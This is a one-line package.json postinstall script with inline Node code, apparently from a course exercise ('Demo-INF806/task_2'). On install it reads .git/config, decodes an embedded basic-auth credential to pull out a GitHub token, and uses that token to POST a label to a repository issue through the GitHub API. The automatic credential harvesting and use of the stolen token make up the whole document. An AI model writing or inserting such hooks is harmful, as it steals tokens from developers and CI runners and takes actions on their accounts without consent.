scripts.postinstall: node -e "const fs = require('fs'); const config = fs.readFileSync('.git/config', 'utf8'); const match = config.match(/AUTHORIZATION: basic (.*)/); if (match) { const base64 = match[1].trim(); const decoded = Buffer.from(base64, 'base64').toString('utf8'); const token = decoded.split(':')[1]; fetch('https://api.github.com/repos/Demo-INF806/task_2/issues/1/labels', { method: 'POST', headers: { 'Authorization': 'Bearer ' + token, 'Accept': 'application/vnd.github+json', 'X-GitHub-Api-Version': '2022-11-28' }, body: JSON.stringify({ labels: ['Baptiste JULLIEN'] }) }).then(r => r.json()).then(console.log); } else { console.log('Token introuvable dans .git/config'); }"
